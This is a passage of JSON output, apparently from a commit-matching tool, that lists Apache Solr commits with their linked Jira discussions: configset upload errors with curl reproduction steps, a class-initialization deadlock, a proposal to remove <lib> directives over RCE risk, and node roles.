org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:191)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.server.handler.InetAccessHandler.handle(InetAccessHandler.java:177)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:146)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:127)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.rewrite.handler.RewriteHandler.handle(RewriteHandler.java:322)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.server.handler.gzip.GzipHandler.handle(GzipHandler.java:763)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:127)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.server.Server.handle(Server.java:516)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.server.HttpChannel.lambda$handle$1(HttpChannel.java:400)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.server.HttpChannel.dispatch(HttpChannel.java:645)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:392)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:277)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:311)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:105)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.io.ChannelEndPoint$1.run(ChannelEndPoint.java:104)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.runTask(EatWhatYouKill.java:338)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:315)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.tryProduce(EatWhatYouKill.java:173)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:131)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:409)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:883)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.util.thread.QueuedThreadPool$Runner.run(QueuedThreadPool.java:1034)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at java.lang. Thread .run( Thread .java:748)\r\n</str>\r\n\u00a0 < int name= \"code\" >500</ int >\r\n</lst>\r\n</response> Expected Behavior The info at the zookeeper config set node 'trusted=true/false' or 'no content ' is kept as it is. Using Schema/Config API breaks the File-Upload of Config Set File The ZkController.touchConfDir() is the place I found that is writing a new byte []{0} at the config set node. Here's my patch suggestion SOLR-16110.patch Reads the current content of the node and re-writes it into the node to keep the data. added a simple mock test in SOLR-16110-1.patch smoldenhauer typically people open up PR's using Github against the github.com/apache/solr project to facilitate review.    Would you be open to doing this?  If not (and some people object!), then I'll happily take the patch as is .   How would you like to be credited? epugh I created the PR with the contents of the patch file. I hope I got it right. At least it showed up here automatically. I did these steps before your patch, and things worked, which I didn't expect.  Notice, I DID have to turn on the security.   WOuld you mind retesting?   Your intuition of what the problem is makes sense to me, I just can't duplicate the error! Test on Solr 8.11 branch curl \"http://localhost:8983/solr/admin/configs?action=CREATE&name=test&baseName=_default\" --> security alert bin/solr auth enable -type basicAuth -prompt true -z localhost:9983 -blockUnknown true --> admin/password curl -u admin:password \"http://localhost:8983/solr/admin/configs?action=CREATE&name=test&baseName=_default\" --> Works curl -u admin:password  \"http://localhost:8983/solr/admin/collections?action=CREATE&name=test&collection.configName=test&numShards=1\" --> WOrks curl -u admin:password  -X POST -H 'Content-Type: application/json' -i http://localhost:8983/solr/test/schema --data '{ \"add-field\": {\r\n     \"name\":\"my-field\",\r\n     \"type\":\"string\",\r\n     \"stored\":true } }' echo ' {\"hello\":\"world\"} ' > test.json --> WOrks curl -u admin:password  -X POST --header \"Content-Type:application/json\" --data-binary @test.json \"http://localhost:8983/solr/admin/configs?action=UPLOAD&name=test&filePath=test.json\" I re-checked your steps to repeat and have to admit that it worked for me, too. In the past I was running the server with \u00a0-Dsolr.disableConfigSetsCreateAuthChecks=true so I did not get the security alert. So it runs into the parse error only with an unauthenticated (unthrusted) request which then tries to call ensureOverwritingUntrustedConfigSet Nevertheless I am still a bit curious about that 0-byte overwriting and wonder if the trusted info at the config set should be overwritten like that. Okay, I just tried it with -Dsolr.disableConfigSetsCreateAuthChecks=true, and it does avoid the security check, so one issue better understood.   (I sent an email to dev mailing list about if we should be keeping this feature in the 9X line, and if we do, we ought to document it!). I went through your steps, on branch_9_0, and I get a JSON parsing error.   Which I referenced in SOLR-16164 .     I'm going to try the fix I outlined in SOLR-16164 , and then see what happens. Okay, with -Dsolr.disableConfigSetsCreateAuthChecks=true and my patch, I was able to get ALL the way to the upload and then had that blow up.... In getConfigMetadata() I am now checking if the ZK data was null (which is what the patch checked for), and it's not null.  Now we get  a JSON parser error! 022-04-25 19:19:42.447 ERROR (qtp1463022229-25) [] o.a.s.h.RequestHandlerBase org.noggit.JSONParser$ParseException: JSON Parse Error: char=,position=0 AFTER='' BEFORE='' => org.noggit.JSONParser$ParseException: JSON Parse Error: char=,position=0 AFTER='' BEFORE='' Okay!!!   With your patch, I now get a NICE error message.   Is this what you think you should be getting?   : { \"responseHeader\": {\r\n    \"status\":400,\r\n    \"QTime\":2} , \"error\":{ \"metadata\":[ \"error-class\",\"org.apache.solr.common.SolrException\", \"root-error-class\",\"org.apache.solr.common.SolrException\"], \"msg\":\"Trying to make an untrusted ConfigSet update on a trusted configSet\", \"code\":400}} I then enable security and it works!!! \u279c  dev git:(branch_9_0) \u2717 curl -u admin:password -X POST --header \"Content-Type:application/json\" --data-binary @test.json \"http://localhost:8983/solr/admin/configs?action=UPLOAD&name=test2&filePath=test.json\" { \"responseHeader\": {\r\n    \"status\":0,\r\n    \"QTime\":80} } Yes, that's what I would have expected to get for the untrusted request. Originally I also expected that I would be allowed to upload to the configset regardless if trusted is true or false due to the switch \u00a0-Dsolr.disableConfigSetsCreateAuthChecks=true We 're going to use authentication in future projects and currently worked around the upload issue. So I would not mind if the switch / untrusted upload mode is not available anymore in Solr 9 I updated the PR to main: https://github.com/apache/solr/pull/831 Commit 98852e5dc67e53f0f2131681c2b562264c3988af in solr's branch refs/heads/main from Kevin Risden [ https://gitbox.apache.org/repos/asf?p=solr.git;h=98852e5dc67 ] SOLR-16110 : Using Schema/Config API breaks the File-Upload of Config Set File (#831) Co-authored-by: Steffen Moldenhauer <s.moldenhauer@intershop.de> Commit e0bf3d4a4bdea9c26e2d774529f36533a48b1411 in solr's branch refs/heads/branch_9x from Kevin Risden [ https://gitbox.apache.org/repos/asf?p=solr.git;h=e0bf3d4a4bd ] SOLR-16110 : Using Schema/Config API breaks the File-Upload of Config Set File (#831) Co-authored-by: Steffen Moldenhauer <s.moldenhauer@intershop.de> Commit 88adac1ae64e4e9626ff593d175fa6732a2bf79e in solr's branch refs/heads/main from Kevin Risden [ https://gitbox.apache.org/repos/asf?p=solr.git;h=88adac1ae64 ] SOLR-16110 : add CHANGES.txt Commit b9b64e16ab959e2fc25d98e8a4f8851cd3bc63a3 in solr's branch refs/heads/branch_9x from Kevin Risden [ https://gitbox.apache.org/repos/asf?p=solr.git;h=b9b64e16ab9 ] SOLR-16110 : add CHANGES.txt Thanks smoldenhauer ! You should see the commit linked to your github handle as well since I based my changes on yours. Bulk closing 9.1 issues. Commit 7bd8229f4db031f81b84e15881a483244967a8e1 in lucene-solr's branch refs/heads/branch_8_11 from Kevin Risden [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=7bd8229f4db ] SOLR-16110 : Using Schema/Config API breaks the File-Upload of Config Set File (#831) Co-authored-by: Steffen Moldenhauer <s.moldenhauer@intershop.de>"
            },
            "ghissue_refs": {
                "831": "Shared PQ Based Early Termination for Concurrent Search #854"
            },
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "CHANGES_RELEVANT_CODE",
                    "message": "The commit modifies code containing relevant filename or methods: This, Solr",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/core/src/java/org/apache/solr/cloud/ZkController.java",
                    "relevance": 8
                },
                {
                    "id": "SEC_KEYWORDS_IN_LINKED_BUG",
                    "message": "The bug tracking ticket SOLR-16110 contains some security-related terms: security",
                    "relevance": 4
                },
                {
                    "id": "BUG_IN_MESSAGE",
                    "message": "The commit message references some bug tracking ticket: SOLR-16110",
                    "relevance": 2
                },
                {
                    "id": "GITHUB_ISSUE_IN_MESSAGE",
                    "message": "The commit message references some github issue: 831",
                    "relevance": 2
                }
            ]
        },
        {
            "commit_id": "89fb1eef03da0a4fec2699a1ba17e6e78402ac28",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1697007754,
            "hunks": 3,
            "message": "SOLR-16165: Rare deadlock in SlotAcc initialization (#819)",
            "changed_files": [
                "solr/core/src/java/org/apache/solr/search/facet/Constants.java",
                "solr/core/src/java/org/apache/solr/search/facet/FacetFieldProcessorByArray.java",
                "solr/core/src/java/org/apache/solr/search/facet/SlotAcc.java"
            ],
            "message_reference_content": [],
            "jira_refs": {
                "SOLR-16165": "The core of the issue is that if a parent class reference an instance of its own child class as a static field, a deadlock can be created if 1 thread tries to access the parent class and another thread to the child class. Thread A \"qtp1393828949-98\" #98 prio=5 os_prio=0 cpu=294.10ms elapsed=6252.75s allocated=53246K defined_classes=243 tid=0x00007fa47c007000 nid=0x349c4e in Object.wait() [0x00007f9896620000] java.lang.Thread.State: RUNNABLE at org.apache.solr.search.facet.SlotAcc.<clinit>(SlotAcc.java:830) at org.apache.solr.search.facet.FacetFieldProcessorByHashDV.createCollectAcc(FacetFieldProcessorByHashDV.java:271) at org.apache.solr.search.facet.FacetFieldProcessorByHashDV.calcFacets(FacetFieldProcessorByHashDV.java:255) Thread B \"qtp1393828949-2379\" #2379 prio=5 os_prio=0 cpu=34.52ms elapsed=6013.46s allocated=20426K defined_classes=0 tid=0x00007fa49c081800 nid=0x34a58b in Object.wait() [0x00007f5fcfae7000] java.lang.Thread.State: RUNNABLE at org.apache.solr.search.facet.FacetFieldProcessorByArray.createCollectAcc(FacetFieldProcessorByArray.java:85) at org.apache.solr.search.facet.FacetFieldProcessorByArray.calcFacets(FacetFieldProcessorByArray.java:144) at org.apache.solr.search.facet.FacetFieldProcessorByArray.process(FacetFieldProcessorByArray.java:94) ... # Thread A : FacetFieldProcessorByHashDV.java:271 indexOrderAcc = new SlotAcc(fcontext) { , which accesses class SlotAcc , it would have a class init lock on SlotAcc (assuming first time loading SlotAcc in classloader) but BEFORE run to line SlotAcc.java:830 Thread B: FacetFieldProcessorByArray.java:85 countAcc = new SweepingCountSlotAcc(numSlots, this); . Accesses SweepingCountSlotAcc (also assuming first time loading SweepingCountSlotAcc in classloader), loads and initialize based on hierarchy SweepingCountSlotAcc > CountSlotArrAcc > CountSlotAcc -> SlotAcc , obtain lock and initialize SweepingCountSlotAcc , CountSlotArrAcc , CountSlotAcc but blocked on loading/initializing parent class SlotAcc , since Thread A has lock and is already initializing it Thread A: run to line 830 static final CountSlotAcc DEV_NULL_SLOT_ACC = new CountSlotAcc(null)... Found CountSlotAcc , it will attempt to load CountSlotAcc as well, but such lock is held by Thread B Deadlock in SlotAcc initialization At FullStory, we encountered this bug recently and created a fix on our fork. This also recently came up on the mailing list so opening a bug and will provide a PR shortly. We also encountered this similar problem. Opened PR 819 Could open this as a separate issue/PR, but I thought it'd be worth checking for other instances of this pattern in the codebase. I attached StaticInitializerReferencesSubClass.xml , a report from Intellij/IDEA that points out other cases (including the SlotAcc case). I'd guess that the SlotAcc case is particularly likely to manifest as deadlock because the subclass reference is buried near the end of the class. The others seem to be near the beginning of their class, so perhaps a narrower window to manifest as deadlock? Or perhaps there's something about the context in which the other cases are called that makes them not vulnerable (or less vulnerable) in practice? As a proof-of-concept I tried integrating palantir's `baseline-error-prone` gradle plugin, which adds a check for ClassInitializationDeadlock . It caught the DocRouter and TimeSource cases, but not any of the others (including SlotAcc). magibney I'd agree that as a separate issue, doing some cleanup of those would be valuable. These can be tricky to encounter and track down in the real world so fixing as many as we can seems like a valiant effort. I'd be happy to help with that. Commit b73a28c90cc552183a8a8b4c07d07c19a299732b in solr's branch refs/heads/main from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=b73a28c90cc ] SOLR-16165 : Rare deadlock in SlotAcc initialization (#819) Commit ccc5db9fd04fa3f22e6f92968a899e40d2318357 in solr's branch refs/heads/main from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=ccc5db9fd04 ] SOLR-16165 : Rare Deadlock in SlotAcc initialization Commit 4c8ea4893d16657ee2ae30e7c2ce89ad929e9a4a in solr's branch refs/heads/branch_9x from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=4c8ea4893d1 ] SOLR-16165 : Rare deadlock in SlotAcc initialization (#819) Commit a7731e8acc56b6b1244abe753e336c2cae37075b in solr's branch refs/heads/branch_9x from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=a7731e8acc5 ] SOLR-16165 : CHANGES.txt Commit d9a039729d1ddca6d03304627d2aad21eeb25006 in solr's branch refs/heads/main from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=d9a039729d1 ] SOLR-16165 : CHANGES.txt Commit c2399dbad4d3eb918a588a6fac92dc240e3d2aeb in solr's branch refs/heads/branch_9_1 from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=c2399dbad4d ] SOLR-16165 : Rare deadlock in SlotAcc initialization (#819) Commit b7ec5b5ada327d0502760bed2e041f6ef5f36fd6 in solr's branch refs/heads/branch_9_1 from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=b7ec5b5ada3 ] SOLR-16165 : CHANGES.txt Commit d22a0781aeadda9061dac167f8aec065dd60f433 in solr's branch refs/heads/branch_9x from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=d22a0781aea ] SOLR-16165 : CHANGES.txt Commit da67c104dab7b9be9d69a9484abf5411260ebdf7 in solr's branch refs/heads/main from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=da67c104dab ] SOLR-16165 : CHANGES.txt Closing after the 9.1.1 release Commit 89fb1eef03da0a4fec2699a1ba17e6e78402ac28 in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=89fb1eef03d ] SOLR-16165 : Rare deadlock in SlotAcc initialization (#819)"
            },
            "ghissue_refs": {
                "819": ""
            },
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "CHANGES_RELEVANT_CODE",
                    "message": "The commit modifies code containing relevant filename or methods: This",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/core/src/java/org/apache/solr/search/facet/Constants.java, solr/core/src/java/org/apache/solr/search/facet/SlotAcc.java, solr/core/src/java/org/apache/solr/search/facet/FacetFieldProcessorByArray.java",
                    "relevance": 8
                },
                {
                    "id": "SEC_KEYWORDS_IN_LINKED_BUG",
                    "message": "The bug tracking ticket SOLR-16165 contains some security-related terms: vulnerable",
                    "relevance": 4
                },
                {
                    "id": "BUG_IN_MESSAGE",
                    "message": "The commit message references some bug tracking ticket: SOLR-16165",
                    "relevance": 2
                },
                {
                    "id": "GITHUB_ISSUE_IN_MESSAGE",
                    "message": "The commit message references some github issue: 819",
                    "relevance": 2
                }
            ]
        },
        {
            "commit_id": "eff22ac1afbb16ba614bfcd190ba122b061ccdf2",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1699292953,
            "hunks": 1,
            "message": "SOLR-16781: Making tests pass",
            "changed_files": [
                "solr/core/src/java/org/apache/solr/core/SolrConfig.java"
            ],
            "message_reference_content": [],
            "jira_refs": {
                "SOLR-16781": "<lib> directives in solrconfig.xml used to be recommended way for including additional jar files to the classpath for a particular collection or collections. For context: This feature required complex handling of \"trusted\" vs \"non-trusted\" configsets in configset upload API to keep Solr secure (i.e. to stop RCE attacks for non-authentication enabled deployments). This security feature also broke down recently due to a bug in Schema designer ( SOLR-16777 ). Supported alternatives exist that are safer: user can add the jar files to Solr's classpath use packages to use custom jars per collection In the light of these, there's no need to continue to support the <lib> directive going forward. I propose to remove the <lib> directives handling and functionality through this issue. Remove directives from Solr If there should be a such a feature , it should be in solr.xml This is a duplicate of SOLR-6681 from 2014! Supported alternatives exist that are safer [... e.g.] use packages to use custom jars per collection Is the package manager ready to take on all of the usecases that our users previously leaned on <lib> for?  I haven't followed package-manager development too closely, but my understanding was that it still had certain limitations that would make it hard to replace <lib> e.g. support for \"standalone\" Solr deployments ( SOLR-16152 ). This feature required complex handling of \"trusted\" vs \"non-trusted\" configsets in configset upload API to keep Solr secure (i.e. to stop RCE attacks for non-authentication enabled deployments) Is the thought then that this ticket would also deprecate or remove the trusted/untrusted distinction in 10?  Or is that still relevant even if <lib> goes away? I think the trusted/untrusted construct is a key pain point. I'm not familiar enough with the other two features that seem to require it to know if we can eliminate that complexity but there might be a way to simplify <lib> handling that removes the need for trusted/untrusted in its case. Rather than getting rid of <lib> entirely, change it so that by default, it throws an error for anything outside the solr classpath. Then add a startup level configuration that adds directories to the legal locations for <lib>. This could be some combination of sysprops/environment or even something in the possible replacement for solr.in.sh contemplated by SOLR-7871 . We can debate if these locations can be recursive, and what to do (if anything) about symlinks. Thus we wind up with a two stage process: The folks who install solr define the playground The folks who interact with solr do whatever they are permitted to within that playground. Ideally in addition to throwing an error when the config set tries to load the upload process would also run this check on any files uploaded to fail fast and friendly for the user. This way would have the benefit that organizations can tune their installation to be as strict or permissive as they like. We should create good clear documentation explaining that allowing libraries to be loaded from a location to which untrusted (or less trusted) users can cause a file to be written (via solr or otherwise) makes it possible for those with config-edit to effectively install code. If they want to run with scissors, knowing the danger, let them, just don't make it the default. I'm not leaping on the solr.xml suggestion because some installs run with solr.xml in zookeeper, and configuring locations where solr can look for stuff seems like something that will be be determined by sysadmin folks at larger organizations who wouldn't want to be mucking around with solr.xml which contains a lot of esoteric search related stuff they might break. I could probably be sold on solr.xml also being a potential source, but if we have more than one location to configure this, precedence and/or merging behavior needs to be clear. PS: solr.xml loading from ZK is deprecated and gone in 10.0. But a config in solr.xml similar to solr.allowPaths makes sense. <str name= \"allowPaths\" >${solr.allowPaths:}</str> The default could be empty set, i.e. nothing allowed, and it would be up to users to define defaults. There could be a few special values: \"*\" means allow all, for quick back-compat etc. Or would it be enough to simply fail if any <lib> is outside the already defined solr.allowPaths (which defaults to $SOLR_HOME, $SOLR_DATA_HOME & coreRootDir? Added a patch for this (branch_8_11). Updated the patch, this is ready to commit. For the record: on ASF slack, janhoy and houstonputman expressed concerns regarding disabling <lib> directives by default. Hence, I'm not committing it right away, even though I think this is the right thing to do. No feature should be enabled by default that can be a security risk for RCEs etc. This holds up the 8.11.3 release, unfortunately. I wonder how we can start messaging to extension developers what they should be doing?   A Plugin Guide?  I'm thinking of all the installations of querqy that jsut use the lib dir... I'm definitely in favor of getting rid of the lib tag because there are better alternatives. \u00a0Let's do so for the next minor release like 9.5! \u00a0(flag to disable; remove altogether in main) No feature should be enabled by default that can be a security risk for RCEs etc That's a sweeping statement. \u00a0Many things can be a risk; Solr has tons of features and the vast majority of them are enabled by default, for better or worse. Take your pick... remember the XML query parser CVE? \u00a0Who would have thought. If I could block one thing by default to enhance Solr security, it'd be any sort of configuration editing, either at core level, or even ConfigSet upload. \u00a0Maybe that's not \"one thing\", it's a category, and I recognize the ConfigSet aspect isn't workable for most users (even though this is how I run Solr at work \u2013 immutable infrastructure). \u00a0Hello FileSystemConfigSetService! \u00a0Sorry; getting a bit off topic. I am for introducing solr.lib.directive.allowed property, and making it default to \"true\" in 8.x and 9.x, but with deprecation logging. Then in main (10.0) we default it to \"false\", and in 11.0 it is removed entirely. This of course requires proper communication, perhaps a blog post or two, etc. It would be a great way to educate users about modules, packages and shardedLib. I like the suggestion that janhoy provided. I'm going to remove this from \"Release Version\" 8.11.3, unless y'all are ready to merge this (with the option set to \"true\" by default). ichattopadhyaya What's the followup plan on this? Do you agree with the conservative plan proposed above Deprecate in 9.6 Enabled by default in 9.x (but with deprecation logging) Disabled by default in 10.x Removed from 11.0 We can remove in 10; no need to wait for 11. Agreed. Remove in 10. Possibly add an option to disable in 9 which is set to \"false\" by default. This option is not included in 10 obviously. Sure, there is still a few 9.x releases where users can start changing their habits. And any user upgrading to 10.0 will have a round of testing where she will have time to move libs to another location, or stay on 9.x a bit longer. Let's do it..."
            },
            "ghissue_refs": {},
            "cve_refs": [],
            "twins": [],
            "tags": [],
            "matched_rules": [
                {
                    "id": "CHANGES_RELEVANT_CODE",
                    "message": "The commit modifies code containing relevant filename or methods: Solr",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/core/src/java/org/apache/solr/core/SolrConfig.java",
                    "relevance": 8
                },
                {
                    "id": "SEC_KEYWORDS_IN_LINKED_BUG",
                    "message": "The bug tracking ticket SOLR-16781 contains some security-related terms: secure, security, rce",
                    "relevance": 4
                },
                {
                    "id": "BUG_IN_MESSAGE",
                    "message": "The commit message references some bug tracking ticket: SOLR-16781",
                    "relevance": 2
                }
            ]
        },
        {
            "commit_id": "2da4332072ffffb0581ef60d11de5b0d157452ac",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1698107825,
            "hunks": 79,
            "message": "SOLR-15694, 15715: Node roles and dedicated query coordinator nodes",
            "changed_files": [
                "solr/contrib/analytics/src/java/org/apache/solr/handler/component/AnalyticsComponent.java",
                "solr/contrib/ltr/src/java/org/apache/solr/ltr/response/transform/LTRFeatureLoggerTransformerFactory.java",
                "solr/contrib/ltr/src/java/org/apache/solr/ltr/search/LTRQParserPlugin.java",
                "solr/core/src/java/org/apache/solr/api/CoordinatorV2HttpSolrCall.java",
                "solr/core/src/java/org/apache/solr/cloud/api/collections/Assign.java",
                "solr/core/src/java/org/apache/solr/cloud/api/collections/CategoryRoutedAlias.java",
                "solr/core/src/java/org/apache/solr/cloud/api/collections/CreateCollectionCmd.java",
                "solr/core/src/java/org/apache/solr/cloud/api/collections/RestoreCmd.java",
                "solr/core/src/java/org/apache/solr/cloud/api/collections/RoutedAlias.java",
                "solr/core/src/java/org/apache/solr/cloud/api/collections/TimeRoutedAlias.java",
                "solr/core/src/java/org/apache/solr/core/CoreContainer.java",
                "solr/core/src/java/org/apache/solr/core/NodeRoles.java",
                "solr/core/src/java/org/apache/solr/handler/ClusterAPI.java",
                "solr/core/src/java/org/apache/solr/handler/RequestHandlerBase.java",
                "solr/core/src/java/org/apache/solr/handler/SolrConfigHandler.java",
                "solr/core/src/java/org/apache/solr/handler/admin/ShowFileRequestHandler.java",
                "solr/core/src/java/org/apache/solr/handler/component/HttpShardHandler.java",
                "solr/core/src/java/org/apache/solr/handler/component/HttpShardHandlerFactory.java",
                "solr/core/src/java/org/apache/solr/handler/component/QueryComponent.java",
                "solr/core/src/java/org/apache/solr/handler/component/RealTimeGetComponent.java",
                "solr/core/src/java/org/apache/solr/handler/component/SearchHandler.java",
                "solr/core/src/java/org/apache/solr/request/DelegatingSolrQueryRequest.java",
                "solr/core/src/java/org/apache/solr/request/SimpleFacets.java",
                "solr/core/src/java/org/apache/solr/request/SolrQueryRequest.java",
                "solr/core/src/java/org/apache/solr/response/transform/CoreAugmenterFactory.java",
                "solr/core/src/java/org/apache/solr/response/transform/TransformerFactory.java",
                "solr/core/src/java/org/apache/solr/search/JoinQParserPlugin.java",
                "solr/core/src/java/org/apache/solr/search/join/ScoreJoinQParserPlugin.java",
                "solr/core/src/java/org/apache/solr/servlet/CoordinatorHttpSolrCall.java",
                "solr/core/src/java/org/apache/solr/servlet/HttpSolrCall.java",
                "solr/core/src/java/org/apache/solr/servlet/SolrDispatchFilter.java",
                "solr/core/src/java/org/apache/solr/update/UpdateLog.java",
                "solr/core/src/java/org/apache/solr/update/processor/DistributedUpdateProcessorFactory.java",
                "solr/core/src/java/org/apache/solr/update/processor/RoutedAliasUpdateProcessor.java",
                "solr/core/src/test-files/solr/configsets/cache-control/conf/schema.xml",
                "solr/core/src/test-files/solr/configsets/cache-control/conf/solrconfig.xml",
                "solr/core/src/test-files/solr/configsets/conf3/conf/schema.xml",
                "solr/core/src/test-files/solr/configsets/conf3/conf/solrconfig.xml",
                "solr/solrj/src/java/org/apache/solr/client/solrj/SolrRequest.java",
                "solr/solrj/src/java/org/apache/solr/client/solrj/impl/BaseCloudSolrClient.java",
                "solr/solrj/src/java/org/apache/solr/common/cloud/ZkStateReader.java",
                "solr/test-framework/src/java/org/apache/solr/SolrTestCaseJ4.java"
            ],
            "message_reference_content": [],
            "jira_refs": {
                "SOLR-15694": "I think we should have first class support for starting a Solr node in a mode whereby no cores will be placed on them. These nodes are useful for certain scenarios: Dedicated overseer nodes Nodes where only plugins are installed and used (e.g. cluster/node level plugins) Dedicated nodes for querying (more on this to come later). Today, to achieve this effect, one can: 1. start a node (which will make it join live_nodes and be immediately available for replica placement). 2. Put replica placement rules or autoscaling policies to prevent replicas from being placed there. This is not standardized, 8x has two ways to achieve this (replica placement rules and autoscaling framework), 9x has a new autoscaling framework. Proposing a start parameter for starting a node that starts the node in this configuration, and then internally this is handled appropriately (across 8x and 9x). This should be Kubernetes/Docker friendly as well, since it is easy to add an additional parameter for a startup (instead of putting things into autoscaling.json in ZK via init scripts). Concept of node roles and non-data nodes This has been discussed many times. I think it should be a generic concept of a \"node role\", which can then be one or more roles that will dictate how the node acts. One role coud be \"zk\", which would let the node start an embedded zookeeper (for a future managed zk feature), and then you could combine it with \"data\" if the node should also be eligible for index/search. There may be other roles such as \"streaming\" perhaps which would only host streaming expression jobs, etc. This is definitely SIP worthy. janhoy , thanks. That is good feedback. This has been discussed many times. Can you please point me to that? Will link to that in future discussions. I think it should be a generic concept of a \"node role\", which can then be one or more roles that will dictate how the node acts. Today, we have a role \"overseer\" for a node. However, many users look for dedicated overseer nodes (nodes that don't handle querying or indexing), and there's no easy way today. and then you could combine it with \"data\" if the node should also be eligible for index/search. Do you recommend that we have a role \"data\" for nodes (regular nodes as we have today)? In that case, what would absence of this \"data\" role for a node mean the node doesn't host any cores? This seems reasonable for what I intend to achieve with usecases I have in mind. This is definitely SIP worthy. I'll create one, thanks janhoy We already have a file /roles.json in ZK. It has a key called \"overseer\" now. We can add a new key called \"query-nodes\" and add nodes to that Ah, did not know about that. A thousand questions pop up, such as: Should roles be supported in leader/follower mode? What would be the best way to designate roles to a node? A global file in ZK like /roles.json is one way. ENV_VARs or SysProps at each node is another. How dynamic do we need this to be, are there business needs to (re)assign roles at runtime, and in that case do we need a REST API for it? If dynamic, what role(s) would a brand new node (or k8s pod) added to the cluster be assigned? What happens if you have only assigned a role to one node and that node leaves the cluster? Should that be configurable, or would there be some cluster level plugin monitoring events, that makes such decisions? etc etc Looking forward to seeing a SIP with a thorough design and recommendation on this. Looking forward to seeing a SIP with a thorough design and recommendation on this. I'll write up the SIP today. We can address these questions there and link to this JIRA. Here's the SIP: https://cwiki.apache.org/confluence/display/SOLR/SIP-15+Node+roles Discussion is happening here: https://lists.apache.org/thread.html/rb3cbfddb6e3af9c671d037ce1e7341544a2f1ab287f184c8f53ac44c%40%3Cdev.solr.apache.org%3E Browsing the other SIPs, SIP-11 is potentially related, as ir proposes some nice cleanup of accessing cluster-level config. Not saying we should not wait for that, but I'll ping ab to explore synergies. Commit 24e5ba7105ea774de0b319337c6809d2839b9f8a in solr's branch refs/heads/jira/SOLR15694 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=solr.git;h=24e5ba7 ] SOLR-15694 : Ref guide changes Commit e32e58c20be0540c6e89679a57aac26616911e3d in solr's branch refs/heads/main from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=solr.git;h=e32e58c ] SOLR-15694 : Node roles Commit e19a13f8146a713fe883c9a17809dc542638cc85 in solr's branch refs/heads/branch_9x from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=solr.git;h=e19a13f ] SOLR-15694 : Node roles Can you close this and also move SIP-15 to correct section in the list? https://cwiki.apache.org/confluence/display/SOLR/Solr+Improvement+Proposals ichattopadhyaya why is this till open? Also the SIP (see previous comment) is listed as \"under discussion\". I'll try once moce ichattopadhyaya noble.paul Can you please move the SIP-15 to the \"Implemented\" section here https://cwiki.apache.org/confluence/display/SOLR/Solr+Improvement+Proposals ? Done. Commit 2088d743db9304492ab19c14bc80c6187f172b79 in lucene-solr's 